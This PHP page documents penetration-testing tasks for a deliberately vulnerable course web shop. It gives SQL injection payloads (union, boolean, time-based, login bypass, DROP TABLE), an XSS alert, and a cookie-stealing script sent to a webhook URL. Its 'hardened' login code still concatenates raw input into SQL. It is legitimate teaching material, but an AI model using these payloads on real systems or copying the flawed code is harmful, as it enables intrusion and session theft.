<?php
require('config/db.php');
require('config/config.php');
session_start();

if (!isset($_SESSION['customer'])) {
    header('Location:' . ROOT_URL . 'login.php?redirect=docs.php');
}

// Get pre-established flags
$flags_query = "SELECT * FROM flags";
$flags_result = mysqli_query($conn, $flags_query);
$flags = mysqli_fetch_all($flags_result, MYSQLI_ASSOC);

// Insert correct answers into backend
$customer_id = $_SESSION['customerId'];
$message = '';
$alert = '';

function check_answer($conn, $message, $flag_answer)
{
    global $message;
    global $alert;
    global $customer_id;

    $query = "SELECT * FROM flags WHERE flag_name='$flag_answer' LIMIT 1";

    $result = mysqli_query($conn, $query);

    $flag = mysqli_fetch_array($result);

    if (mysqli_num_rows($result) == 1) {

        $flag_id = intval($flag['id']);

        $flags_achieved_query = "SELECT * FROM flags_achieved WHERE customer_id=$customer_id AND flag_id='$flag_id' LIMIT 1";
        $flags_achieved_result = mysqli_query($conn, $flags_achieved_query);

        if (mysqli_num_rows($flags_achieved_result) !== 1) {
            $message = "Success, you got it right!";
            $alert = 'alert-success';
            $insert_query = "INSERT INTO flags_achieved (customer_id, flag_id, flag_name) VALUES('$customer_id','$flag_id', '$flag_answer')";
            mysqli_query($conn, $insert_query);
        }
    } else {
        $message = "Wrong answer try again";
        $alert = 'alert-danger';
    }
}

if (isset($_POST['submit_one_answer'])) {
    check_answer($conn, $message, mysqli_real_escape_string($conn, $_POST['flag_one_answer']));
} else if (isset($_POST['submit_two_answer'])) {
    check_answer($conn, $message, mysqli_real_escape_string($conn, $_POST['flag_two_answer']));
} else if (isset($_POST['submit_three_answer'])) {
    check_answer($conn, $message, mysqli_real_escape_string($conn, $_POST['flag_three_answer']));
} else if (isset($_POST['submit_four_answer'])) {
    check_answer($conn, $message, mysqli_real_escape_string($conn, $_POST['flag_four_answer']));
} else if (isset($_POST['submit_five_answer'])) {
    check_answer($conn, $message, mysqli_real_escape_string($conn, $_POST['flag_five_answer']));
} else if (isset($_POST['submit_six_answer'])) {
    check_answer($conn, $message, mysqli_real_escape_string($conn, $_POST['flag_six_answer']));
} else if (isset($_POST['submit_seven_answer'])) {
    check_answer($conn, $message, mysqli_real_escape_string($conn, $_POST['flag_seven_answer']));
} else if (isset($_POST['submit_eight_answer'])) {
    check_answer($conn, $message, mysqli_real_escape_string($conn, $_POST['flag_eight_answer']));
} else if (isset($_POST['submit_nine_answer'])) {
    check_answer($conn, $message, mysqli_real_escape_string($conn, $_POST['flag_nine_answer']));
}

// Enter as value questions that have been answered correctly
$flags_achieved_query = "SELECT * FROM flags_achieved WHERE customer_id = $customer_id";
$flags_achieved_result = mysqli_query($conn, $flags_achieved_query);
$flags_achieved = mysqli_fetch_all($flags_achieved_result, MYSQLI_ASSOC);

// Flags progress
$flags_progress = floor(count($flags_achieved) / count($flags) * 100);

// Recreate the products table onclick
function recreate_table()
{
    global $conn;
    $query = "CREATE TABLE products (
        id int(11) AUTO_INCREMENT,
        title varchar(255) NOT NULL,
        description text NOT NULL,
        image varchar(255) NOT NULL,
        price float,
        created_at datetime DEFAULT CURRENT_TIMESTAMP,
        cat_id int,
        PRIMARY KEY  (id)
        )";
    mysqli_query($conn, $query);
}

if (isset($_POST['submit_recreate_product_table'])) {
    recreate_table();
}

// Delete from products for XSS attack and Session Hijacking
if (isset($_POST['submit_remove_last_product_row'])) {
    $products_query = "DELETE FROM products WHERE description LIKE '%script%'";
    mysqli_query($conn, $products_query);
}

// Make flag progress 0 and remove all answers from flags_achieved table
if (isset($_POST['submit_reset_flag_answers'])) {
    $flags_progress = 0;
    $flags_delete_query = "DELETE FROM flags_achieved WHERE customer_id = $customer_id";
    mysqli_query($conn, $flags_delete_query);
}

?>
<?php include("inc/header.php"); ?>
<!-- Confetticelebration when all questions answered correctly -->
<script src="js/confetti.js"></script>
<?php if ($flags_progress == 100) : ?>
    <script>
        startConfetti();
    </script>
    <style>
        canvas {
            display: block;
            position: absolute;
            top: 0;
            z-index: 1 !important;
        }

        #confetti-card {
            position: absolute;
            top: 40%;
            left: 25%;
            /* transform: translateX(-50%) translateY(-50%); */
            z-index: 2 !important;
        }
    </style>
    <div id="confetti-card" class="card bg-success text-white text-center w-50 animate__animated animate__tada">
        <div class="card-body">
            <strong>🎉 Congratulations you have completed all the tasks! 🎉</strong>
            <form method="post">
                <button class="btn btn-outline-light w-100 mt-3" name="submit_reset_flag_answers" type="submit">Reset Answers</button>
            </form>
        </div>
    </div>
<?php endif; ?>


<?php if ($message != '') : ?>
    <div id="payment_success_alert" class="alert <?php echo $alert; ?> d-flex justify-content-between animate__animated animate__fadeInUp" role="alert">
        <?php echo $message; ?>
        <button type="button" class="btn-close" data-bs-dismiss="alert" data-bs-target="#payment_success_alert" aria-label="Close"></button>
    </div>
<?php endif; ?>

<h1 class="mb-5">Security Documentation</h1>

<h3>Introduction</h3>
<div class="mb-5">
    <p>This is a website designed for penetration testing and hardening. It is aimed at achieving the learning objectives for the TLM Level Two Cyber Security &amp; Digital Forensics, unit four project.</p>
    <p>Use this documentation to find out some of the vulnerabilities that exist on this website and how to execute attacks against them, in the step-by-step tasks below. This page should also help you find what you could do to secure against these vulnerabilties.</p>
    <p>You will need to complete all the tasks below. The following are the steps on how you should go about this...</p>
    <ol>
        <li>Scan for vulnerabilities</li>
        <li>Penetration test</li>
        <li>Secure against successful penetration</li>
        <li>Scan for vulnerabilities</li>
    </ol>
    <p><mark>Complete all penetration tests first and then secure each one.</mark></p>
</div>

<h3>Flags</h3>
<div class="progress mb-5">
    <div class="progress-bar" role="progressbar" style="width: <?php echo $flags_progress; ?>%" aria-valuenow="<?php echo $flags_progress; ?>" aria-valuemin="0" aria-valuemax="100"><?php echo $flags_progress; ?>%</div>
</div>

<h3>Penetration Tests &amp; Hardening</h3>
<div class="accordion accordion-flush mb-4" id="accordionExample">
    <div class="accordion-item">
        <h2 class="accordion-header" id="headingOne">
            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseOne" aria-expanded="false" aria-controls="collapseOne">
                Task 1 <i class="fas fa-search mx-2"></i>Vulnerability Scan
            </button>
        </h2>
        <div id="collapseOne" class="accordion-collapse collapse" aria-labelledby="headingOne" data-bs-parent="Task accordionExample">
            <div class="accordion-body">
                <strong>Setting up</strong>
                <ol>
                    <li>Get a feel of this site and look all the pages that are on here or maybe even place some orders with your own customer account.</li>
                    <li>Make sure you have installed Nmap and SQLmap on your local machine or on the Raspberry Pi assigned to your team.</li>
                </ol>
                <strong>Nmap scan for SQL Injection</strong>
                <ol>
                    <li>Download and install SQL map using the command line using brew from this <a href="https://macappstore.org/sqlmap/">link</a></li>
                    <li>Then navigate to <code>/usr/local/Cellar/sqlmap/1.5.11/bin</code></li>
                    <li>Run the following command <code>python sqlmap.py -u "<?php echo ROOT_URL; ?>admin/login.php" --forms --crawl=2</code>. When you try this for another session you may need use this command <code>--flush-session</code></li>
                    <img src="images/sqlmap.png" alt="" class="w-100">
                    <li>You should follow the options with the capitalised 'Y' or 'N' and when it comes to rerouting post then 'n'</li>
                    <li>You should see outputs with bold or colour higlighting indicating if something is Injectible or not</li>
                    <img src="images/sqlmap_output.png" alt="" class="w-100">
                    <li>For more information visit <a href="https://sqlmap.org/">here</a>.</li>
                </ol>
                <strong>Nmap scan for version discovery</strong>
                <ol>
                    <li>nmap –sV –script vuln tar.get.ip.add This should scan for the version of software that this website is using or hosted on.
                    </li>
                </ol>
                <h5 class="text-success">Answer the question below</h5>
                <form method="post">
                    <label for="flag_one_answer">Click submit when Burp task is complete</label>
                    <div class="input-group mb-3">
                        <input type="text" class="form-control" id="flag_one_answer" name="flag_one_answer" placeholder="No Answer Required" value="No Burp Answer Required" aria-label="Recipient's username" aria-describedby="basic-addon2" readonly>
                        <div class="input-group-append">
                            <button class="btn btn-outline-success" name="submit_one_answer" type="submit"><i class="far fa-paper-plane"></i> Submit</button>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <div class="accordion-item">
        <div class="accordion-header" id="headingTwo">
            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseTwo" aria-expanded="false" aria-controls="collapseTwo">
                Task 2 <i class="fas fa-syringe mx-2"></i> SQL Injection
            </button>
        </div>
        <div id="collapseTwo" class="accordion-collapse collapse" aria-labelledby="headingTwo" data-bs-parent="#accordionExample">
            <div class="accordion-body">
                <strong>Penetration testing with In-Band, Error-Based and Union-Based SQL injection</strong>
                <small>The example below will be retrieving admin username and password.</small>
                <p class="mt-2">When an attacker is able to initiate the attack and collect the results using the same communication channel, this is known as in-band SQL injection. Error-based SQL injection and Union-based SQL injection are the two most frequent types of in-band SQL injection.</p>
                <ol class="mt-3">
                    <li>Click the view details button on any of the products to go to a single product page.</li>
                    <li>Check for columns with <code><?php echo ROOT_URL; ?>product.php?id=0 union select 1,2,3</code> and increment by seperating with a comma until product display. You can check the range with this <code><?php echo ROOT_URL; ?>product.php?id=0 order by 1,2,3</code> The range always starts from 1 to the correct number of culumns anything more than that will throw you an error. </li>
                    <li>Remove the product id and add the following into the url like this <code><?php echo ROOT_URL; ?>product.php?id=0 union select 1,2,3,4,5,6,7</code></li>
                    <li>Now that you can see which numbers are being outputed on the page replace one of them with <code>database()</code> and should look like this <code><?php echo ROOT_URL; ?>product.php?id=0 union select 1,database(),3,4,5,6,7</code> This should give you the database name.</li>
                    <li>We will now gather the names of the tables like this <code><?php echo ROOT_URL; ?>product.php?id=0 union select 1,database(),group_concat(table_name),4,5,6,7 FROM information_schema.tables WHERE table_schema="database_name"</code></li>
                    <li>Search the admin table for the column names like this <code><?php echo ROOT_URL; ?>product.php?id=0 union select 1,group_concat(column_name),3,4,5,6,7 FROM information_schema.columns WHERE table_name="admin"#</code></li>
                    <li>Now you know you have username and password columns, retrieve the information from them like this <code>0 union select 1,group_concat(username,':',password SEPARATOR '&lt;br&gt;'),3,4,5,6,7 FROM admin</code></li>
                </ol>
                <h5 class="text-success">Answer the question below</h5>
                <form method="POST">
                    <label for="flag_two_answer">What is the name of the flag?</label>
                    <div class="input-group mb-3">
                        <input type="text" class="form-control" id="flag_two_answer" name="flag_two_answer" value="<?php foreach ($flags_achieved as $flags) {
                                                                                                                        echo $flags['flag_id'] == 2 ? $flags['flag_name'] : '';
                                                                                                                    } ?>" aria-label="Recipient's username" aria-describedby="basic-addon2">
                        <div class="input-group-append">
                            <button class="btn btn-outline-success" name="submit_two_answer" type="submit"><i class="far fa-paper-plane"></i> Submit</button>
                            <a href="<?php echo ROOT_URL; ?>product.php?id=1&tour=in_band_sqli" class="btn btn-warning"><i class="far fa-question-circle"></i> Hint</a>
                        </div>
                    </div>
                </form>
                <hr>
                <strong>Penetration testing with Blind SQL injection - Authentication Bypass</strong>
                <small>The example below will be bypassing authentication.</small>
                <p class="mt-2">To bypass login and gain access to restricted area, the hacker needs to build an SQL segment that will modify the query and make it true. </p>
                <ol class="mt-3">
                    <li>Visit the admin side of the website <a href="<?php echo ROOT_URL; ?>admin/login.php" target="_blank">here</a></li>
                    <li>In the username enter the following <code>' or 1=1;#</code>. Password can be empty or anything.</li>
                </ol>
                <h5 class="text-success">Answer the question below</h5>
                <form method="post">
                    <label for="flag_three_answer">What is the name of the flag?</label>
                    <div class="input-group mb-3">
                        <input type="text" class="form-control" id="flag_three_answer" name="flag_three_answer" value="<?php foreach ($flags_achieved as $flags) {
                                                                                                                            echo $flags['flag_id'] == 3 ? $flags['flag_name'] : '';
                                                                                                                        } ?>" aria-label="Recipient's username" aria-describedby="basic-addon2">
                        <div class="input-group-append">
                            <button class="btn btn-outline-success" name="submit_three_answer" type="submit"><i class="far fa-paper-plane"></i> Submit</button>
                            <a href="<?php echo ROOT_URL; ?>admin/login.php?tour=auth_bypass_sqli" class="btn btn-warning"><i class="far fa-question-circle"></i> Hint</a>
                        </div>
                    </div>
                </form>
                <hr>
                <strong>Penetration testing with Blind SQL injection - Boolean Based</strong>
                <small>The example below will be retrieving the database name.</small>
                <p class="mt-2">The technique of submitting a SQL query to the database and forcing the application to produce a different result depending on whether the query returns a TRUE or FALSE result is known as Boolean-based SQL Injection.</p>
                <ol class="mt-3">
                    <li>View the details of any product so you're on a single product page. Every time you see the display change it means that the output is true or false.</li>
                    <li>First we need to find the length of the database name like this <code><?php echo ROOT_URL; ?>product.php?id=0 or length(database())=1;</code>. Keep increasing number 1 on the end until you see a different display. This will indicate the length of the database name.</li>
                    <li>Now you will need to check each character from A-Z times the length of the database name. <code><?php echo ROOT_URL; ?>product.php?id=0 or substring(database(),1,1)="a";</code> In this <code>substring(database(),1,1)</code> the second parameter means check the first character and the third parameter means check only one character. You can adjust this to find all the characters one step at a time in different combinations. Again each time you do this you should see a change in display.</li>
                    <li>You can try the SQL <code>LIKE</code> query function to speed up the process like this <code><?php echo ROOT_URL; ?>product.php?id=0 or database() like "%a%";</code>. If the display is changed it means there's an 'a' here and inbetween the <code>"%%"</code>, this known as a Wildcard and it checks any place before and after the character you have placed inbetween them. This way you can filter out any characters that have not been used and only try the ones that are in the database namew with the above method.</li>
                    <li>If you don't know or can't figure out the character you can add an underscore or percentage like this <code><?php echo ROOT_URL; ?>product.php?id=0 or database() like "ex_mple";</code>. You can use as many underscore as you need but will only output true if you use the same amount of characters found in the database name.</li>
                </ol>
                <h5 class="text-success">Answer the question below</h5>
                <form method="post">
                    <label for="flag_four_answer">What is the name of the flag?</label>
                    <div class="input-group mb-3">
                        <input type="text" class="form-control" id="flag_four_answer" name="flag_four_answer" value="<?php foreach ($flags_achieved as $flags) {
                                                                                                                            echo $flags['flag_id'] == 4 ? $flags['flag_name'] : '';
                                                                                                                        } ?>" aria-label="Recipient's username" aria-describedby="basic-addon2">
                        <div class="input-group-append">
                            <button class="btn btn-outline-success" name="submit_four_answer" type="submit"><i class="far fa-paper-plane"></i> Submit</button>
                            <a href="<?php echo ROOT_URL; ?>product.php?id=1&tour=boolean_based_sqli" class="btn btn-warning"><i class="far fa-question-circle"></i> Hint</a>
                        </div>
                    </div>
                </form>
                <hr>
                <strong>Penetration testing with Time-Based SQL injection</strong>
                <small>This example below will show you how you can test for the length of the database name as well as testing for characters in the datbase</small>
                <p class="mt-2">Time-based SQL Injection is an attack that uses a SQL query to cause the database to wait for a set period of time (in seconds) before replying. The attacker will be able to tell if the query result is TRUE or FALSE based on the response time. This is also helpful when you have a screen which does not display anything or a different output. So instead we look at the time it's taken for the server to process the request.</p>
                <ol>
                    <li>Look at the following url <code><?php echo ROOT_URL; ?>product.php?id=0 or if(condition, true, false);</code>, the condition is you what your checking aginst for a true or false statement like <code>database()="a"</code>, the true part is where you'll put <code>sleep(5)</code>, and for the false part you put a different sleep() amount. This way when you get a response that took 5 seconds then you know your condition came back true. It won't be exactly the same amount of seconds depending on internet speeds etc. </li>
                    <li>Visit any single product page and try something like this <code><?php echo ROOT_URL; ?>product.php?id=0 or if(length(database())="1", sleep(2), sleep(5));</code> Speed this up even more by using the less than or greater than symbol like this <code>and if(length(database())>"1", sleep(2), sleep(5));</code> This should give you an indication of how many letters you need.</li>
                    <li>Once you have found the length of the database, now try and get the characters like this <code><?php echo ROOT_URL; ?>product.php?id=0 or if(database()="c", sleep(2), sleep(5));</code> This may require you try cycle through all the letters in the alphabet without knowing how many letters you need to do it for so try the next step.</li>
                    <li>In the if conditions part <code><?php echo ROOT_URL; ?>product.php?id=0 or if(condition, true, false);</code> try the combinations from the previous taks to gather the characters and remember to count the seconds. Once you have done this then enter the database name like this <code><?php echo ROOT_URL; ?>product.php?id=0 or if(database()="database_name", sleep(2), sleep(5));</code> to get the flag.</li>
                    <li>Remember you're not looking for an output change just counting the load times in seconds. Only use two seconds for the true parameter and five seconds for the false parameter so you can get the flag</li>
                </ol>
                <h5 class="text-success">Answer the question below</h5>
                <form method="post">
                    <label for="flag_five_answer">What is the name of the flag?</label>
                    <div class="input-group mb-3">
                        <input type="text" class="form-control" id="flag_five_answer" name="flag_five_answer" value="<?php foreach ($flags_achieved as $flags) {
                                                                                                                            echo $flags['flag_id'] == 5 ? $flags['flag_name'] : '';
                                                                                                                        } ?>" aria-label="Recipient's username" aria-describedby="basic-addon2">
                        <div class="input-group-append">
                            <button class="btn btn-outline-success" name="submit_five_answer" type="submit"><i class="far fa-paper-plane"></i> Submit</button>
                            <a href="<?php echo ROOT_URL; ?>product.php?id=1&tour=time_based_sqli" class="btn btn-warning"><i class="far fa-question-circle"></i> Hint</a>
                        </div>
                    </div>
                </form>
                <hr>
                <strong>Penetration testing with SQL injection</strong>
                <small>The example below will be used to delete an entire table in the MySQL database.</small>
                <ol class="mt-3">
                    <li>Use the presentation to understand what SQL injection is, what they can do, and how they work. </li>
                    <li>Visit <a href="<?php echo ROOT_URL; ?>admin/create.php" target="_blank">create product</a> page and in the description input field add the following SQL query <code>'); DROP TABLE products; --</code> You can leave the other fields empty if you want.</li>
                    <li>Visit any of the page where all the products are usually displayed, when you see that they've disappered, this means that the products table has been deleted</li>
                    <li>You will need to recreate the product table by clicking button below before moving on. You may need to check that this has worked by creating a product too.</li>
                    <form method="POST"><button id="recreate_table" class="btn btn-outline-secondary my-3" name="submit_recreate_product_table">Recreate Table</button></form>
                    <img src="images/products_table.png" alt="" class="w-75">
                </ol>
                <h5 class="text-success">Answer the question below</h5>
                <form method="post">
                    <label for="flag_six_answer">What is the name of the flag?</label>
                    <div class="input-group mb-3">
                        <input type="text" class="form-control" id="flag_six_answer" name="flag_six_answer" value="<?php foreach ($flags_achieved as $flags) {
                                                                                                                        echo $flags['flag_id'] == 6 ? $flags['flag_name'] : '';
                                                                                                                    } ?>" aria-label="Recipient's username" aria-describedby="basic-addon2">
                        <div class="input-group-append">
                            <button class="btn btn-outline-success" name="submit_six_answer" type="submit"><i class="far fa-paper-plane"></i> Submit</button>
                            <a href="<?php echo ROOT_URL; ?>admin/login.php?tour=drop_table_sqli" class="btn btn-warning"><i class="far fa-question-circle"></i> Hint</a>
                        </div>
                    </div>
                </form>
                <div class="card text-white bg-dark">
                    <div class="card-body">
                        <strong>Hardening against SQL injection</strong>
                        <ol class="mt-3">
                            <li>Go through every files with .php extension with nano.</li>
                            <li>Change anywhere you see <code>mysqli_multi_query($conn, $query)</code> to <code>mysqli_query($conn, $query)</code> </li>
                            <li>Anywhere you see that a variable is set to $_POST[''] or $_GET[''] add the SQL escape special characters function like this <code>$title = mysqli_real_escape_string($conn, $_POST['title']);</code></li>
                            <li>Read Only: Using prepared statements where a developer creates the SQL query first in a prepared query, and then any user inputs are added as a parameter later. Preparing statements guarantees that the SQL code structure remains constant and that the database can tell the difference between the query and the data. It also makes your code look clearer and simpler to read as a bonus.</li>
                            <li>Repeat the penetration test from above and you should see it having no affect or it may throw you errors that your query syntax is incorrect.</li>
                        </ol>
                        <small>To learn more visit Tryhackme's <a href="https://tryhackme.com/room/sqlinjectionlm">SQL Injection Room</a></small>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="accordion-item">
        <div class="accordion-header" id="headingThree">
            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseThree" aria-expanded="false" aria-controls="collapseThree">
                Task 3 <i class="fas fa-code px-2"></i> Cross-Site Scripting
            </button>
        </div>
        <div id="collapseThree" class="accordion-collapse collapse" aria-labelledby="headingThree" data-bs-parent="#accordionExample">
            <div class="accordion-body">
                <strong>Penetration testing with Cross-Site Scripting.</strong>
                <small>The example below will be used to show you how to insert a script through a form.</small>
                <ol class="mt-3">
                    <li>Use the presentation to understand what Cross-Site Scripting is, what they can do, and how they work. </li>
                    <li>Visit the <a href="create.php">create product</a> page and in the description input field add the following <code>&lt;script id="xss"&gt;alert("Attacked by XSS");&lt;/script&gt;</code>.</li>
                    <li>Enter the rest of the information as you would on a normal product entry</li>
                    <li>Visit the homepage after you have submitted the form and view the details of the product you have created with the XSS attack</li>
                    <li>You should see an alert executed with javascript</li>
                    <li>Once you have completed this task click on the button below to delete the script</li>
                    <form method="POST"><button class="btn btn-outline-secondary my-3" name="submit_remove_last_product_row">Delete XSS</button></form>
                </ol>
                <h5 class="text-success">Answer the question below</h5>
                <form method="post">
                    <label for="flag_seven_answer">What is the name of the flag?</label>
                    <div class="input-group mb-3">
                        <input type="text" class="form-control" id="flag_seven_answer" name="flag_seven_answer" value="<?php foreach ($flags_achieved as $flags) {
                                                                                                                            echo $flags['flag_id'] == 7 ? $flags['flag_name'] : '';
                                                                                                                        } ?>" aria-label="Recipient's username" aria-describedby="basic-addon2">
                        <div class="input-group-append">
                            <button class="btn btn-outline-success" style="width: 25rem;" name="submit_seven_answer" type="submit"><i class="far fa-paper-plane"></i> Submit</button>
                            <a href="<?php echo ROOT_URL; ?>admin/login.php?tour=cross_site_script" class="btn btn-warning"><i class="far fa-question-circle"></i> Hint</a>
                        </div>
                    </div>
                </form>
                <div class="card text-white bg-dark">
                    <div class="card-body">
                        <strong>Hardening against Cross-Site Scripting</strong>
                        <ol class="mt-3">
                            <li>Open the file for the create.php with nano</li>
                            <li>From lines 9 to 11 wrap form value variables like this <code>$title = mysqli_real_escape_string($conn, htmlspecialchars($_POST['title']));</code></li>
                            <li>Delete the previous XXS attack entry in your phpmyadmin</li>
                            <li>Repeat the attack again and then visit phpmyadmin. You should see that part of the script tag has been replaced with html special characters</li>
                        </ol>
                        <small>To learn more visit Tryhackme's <a href="https://tryhackme.com/room/xssgi">Cross-Site Scripting Room</a></small>
                    </div>

                </div>
            </div>
        </div>
    </div>
    <div class="accordion-item">
        <div class="accordion-header" id="headingFour">
            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseFour" aria-expanded="false" aria-controls="collapseFour">
                Task 4 <i class="far fa-clone px-2"></i> Session Hijacking
            </button>
        </div>
        <div id="collapseFour" class="accordion-collapse collapse" aria-labelledby="headingFour" data-bs-parent="#accordionExample">
            <div class="accordion-body">
                <strong>Penetration testing with Session Hijacking Scripting.</strong>
                <small>The example below will be used to show you how to use another users session with Cross-Site Scripting</small>
                <ol class="mt-3">
                    <li>Use the presentation to understand what Session Hijacking is, what they can do, and how they work.</li>
                    <li>Visit the login page and signin or register if you need to</li>
                    <li>Place some orders by adding products to the card and checking them out. You should be redirected to your myaccount page which should list your orders.</li>
                    <li>You should be redirected to the myaccount page to confirm that you have signed in</li>
                    <li>visit this <a href="https://webhook.site/" target="_blank">website</a> and copy the webhook url.</li>
                    <li>Go back to the website and sign in as admin <a href="<?php echo ROOT_URL; ?>admin/" target="_blank">here</a>. Create a new product and make sure to fill everything in so it still looks legitamate, and in the description input field add a few words with the following piece of code.
                        <code>
                            &lt;script&gt;document.write(''&lt;img src="yourwedbhookurl?c=''+document.cookie+''" hidden/&gt;'');&lt;/script&gt;
                        </code>
                    </li>
                    <li>Go and visit the single page of the product that you made and then return back to the website where you have your websitehook. You should see a new url with a parameter that has the session ID.</li>
                    <li>Copy this session id after the %3D characters.</li>
                    <li>Open this site on a different browser and login with a different user or register another.</li>
                    <li>Right click on the browser, inspect the website and navigate to where the cookie storage is.</li>
                    <li>You should see your session id, with most browsers you can double-click and edit. What we will do is replace it with the one we copied.</li>
                    <li>Refresh the page or visit the myaccount page and you should see the same profile as the first one.</li>
                    <li>Complete this task with a team member and see if you can get into their session. Make sure to have different orders placed to tell the difference.</li>
                    <li>Once you have completed this task click on the button below to delete the script</li>
                    <form method="POST"><button class="btn btn-outline-secondary my-3" name="submit_remove_last_product_row">Delete XSS</button></form>
                </ol>
                <h5 class="text-success">Answer the question below</h5>
                <form method="post">
                    <label for="flag_eight_answer">What is the value of sec-fetch-dest in webhook.site?</label>
                    <div class="input-group mb-3">
                        <input type="text" class="form-control" id="flag_eight_answer" name="flag_eight_answer" value="<?php foreach ($flags_achieved as $flags) {
                                                                                                                            echo $flags['flag_id'] == 8 ? $flags['flag_name'] : '';
                                                                                                                        } ?>" aria-label="Recipient's username" aria-describedby="basic-addon2">
                        <div class="input-group-append">
                            <button class="btn btn-outline-success" style="width: 25rem;" name="submit_eight_answer" type="submit"><i class="far fa-paper-plane"></i> Submit</button>
                        </div>
                    </div>
                </form>
                <div class="card text-white bg-dark">

                    <div class="card-body">
                        <strong>Hardening against Session Hijacking</strong>
                        <ol class="mt-3">
                            <li>In login.php set the session cookie parameters like below for the cookie to be only available through httpOnly. This is to prevent access to this information through javascript and prevent XSS from gaing that information. To do this go to login.php and set the session like below. Once this code, go to the create form from the dashboard and add another entry but with a XXS script. You should see when you go back to the website and delete the webhook you received, visit the single page again and then visit the webpage.</li>
                            <code style="white-space:pre-line">
                                // Start the session
                                function sessionStart($lifetime, $path, $domain, $secure, $httpOnly)
                                {
                                session_set_cookie_params($lifetime, $path, $domain, $secure, $httpOnly);
                                session_start();
                                }

                                // liftime is 0 means aslong as browser open
                                // Domain is local host so it can't be manipluated from another domain
                                // Secure is false because we're not using SSL
                                // httpOnly should always be true so the session or cooklie cannot be accessed using javascript code

                                if (isset($_POST["login_submit"])) {

                                $username = $_POST['username'];
                                $password = $_POST['password'];

                                $query = "SELECT * FROM customers WHERE username='$username' AND password='$password' LIMIT 1";

                                $result = mysqli_query($conn, $query);

                                $row = mysqli_fetch_assoc($result);

                                if (mysqli_num_rows($result) == 1) {
                                session_id($_COOKIE[session_name()]);
                                sessionStart(0, '/', 'localhost', false, true);
                                $_SESSION['customer'] = $username;
                                $_SESSION['customerId'] = $row['id'];
                                header('Location:' . ROOT_URL . "myaccount.php");
                                } else {
                                $message = 'The username or password is incorrect!';
                                }
                                }

                            </code>
                            <li>Also if you're going to add SSL to this website, just set the ssl parameter to true like this </li><code style="display: block; white-space: pre-wrap ">sessionStart(0, '/', 'localhost', true, true);</code>
                        </ol>
                    </div>

                </div>
            </div>
        </div>
    </div>
    <div class="accordion-item">
        <div class="accordion-header" id="headingFive">
            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseFive" aria-expanded="false" aria-controls="collapseFive">
                Task 5 <i class="fas fa-server px-2"></i> Apache2 Hardening
            </button>
        </div>
        <div id="collapseFive" class="accordion-collapse collapse" aria-labelledby="headingFive" data-bs-parent="#accordionExample">
            <div class="accordion-body">
                For both penetration testing and hardening your Raspberry Pi then please follow the Apache2 Hardening presentation <a href="https://docs.google.com/presentation/d/1Vvi1l0rMO3pg2Pxk5S6kCqMOtNRXXE4c/edit">here</a>.
                <h5 class="text-success mt-3">Answer the question below</h5>
                <form method="post">
                    <label for="flag_nine_answer">Click submit when Apache2 task is complete</label>
                    <div class="input-group mb-3">
                        <input type="text" class="form-control" id="flag_nine_answer" name="flag_nine_answer" placeholder="No Answer Required" value="No Apache2 Answer Required" aria-label="Recipient's username" aria-describedby="basic-addon2" readonly>
                        <div class="input-group-append">
                            <button class="btn btn-outline-success" style="width: 25rem;" name="submit_nine_answer" type="submit"><i class="far fa-paper-plane"></i> Submit</button>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <div class="accordion-item">
        <div class="accordion-header" id="headingSix">
            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseSix" aria-expanded="false" aria-controls="collapseFive">
                Conclusion
            </button>
        </div>
        <div id="collapseSix" class="accordion-collapse collapse" aria-labelledby="headingSix" data-bs-parent="#accordionExample">
            <div class="accordion-body">
                <strong>What can you do after this project to learn more about web applications and penetration testing?</strong>
            </div>
        </div>
    </div>
</div>
<?php include("inc/footer.php"); ?>